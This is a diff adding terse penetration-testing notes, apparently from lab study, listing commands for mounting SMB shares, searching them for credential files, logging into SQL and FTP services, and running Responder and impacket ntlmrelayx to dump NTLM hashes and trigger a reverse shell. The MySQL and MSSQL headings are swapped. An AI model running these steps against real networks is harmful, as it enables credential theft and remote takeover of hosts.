@@ -1,0 +1,55 @@
+Windows SMB:
+  dir \\192.168.220.129\Finance\
+  net use n: \\192.168.220.129\Finance      show in n: drive
+  net use n: \\192.168.220.129\Finance /user:plaintext Password123      with creds
+
+  dir n:\*cred*
+  findstr      https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr#examples
+
+
+Linux SMB:
+  sudo mkdir /mnt/Finance
+  sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
+    sudo mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
+
+  find /mnt/Finance/ -name *cred*
+  grep -rn /mnt/Finance/ -ie cred
+  locate
+
+
+MySQL:
+  sqsh -S 10.129.20.13 -U username -P Password123      Linux
+  sqlcmd -S 10.129.20.13 -U username -P Password123    Windows
+
+MsSQL:
+  mysql -u username -pPassword123 -h 10.129.20.13      Linux
+  mysql.exe -u username -pPassword123 -h 10.129.20.13  Windows
+
+Coss Platform:
+  https://github.com/dbeaver/dbeaver
+
+Enumerate acc pwd:
+  https://learn.microsoft.com/en-us/sql/t-sql/statements/statements?view=sql-server-ver15
+
+
+FTP:
+  passive
+  prompt
+  mget *
+
+SMB:
+  smbclient
+  smbmap
+  rpcclient
+  enum4linux
+
+  Windows SMB:
+    https://github.com/fortra/impacket/blob/master/examples/psexec.py
+    https://github.com/fortra/impacket/blob/master/examples/smbexec.py
+    https://github.com/fortra/impacket/blob/master/examples/atexec.py
+
+    middel man
+      https://github.com/lgandx/Responder
+         sudo responder -I ens33
+      impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146      dump NTLM hashes
+      impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'https://www.revshells.com'
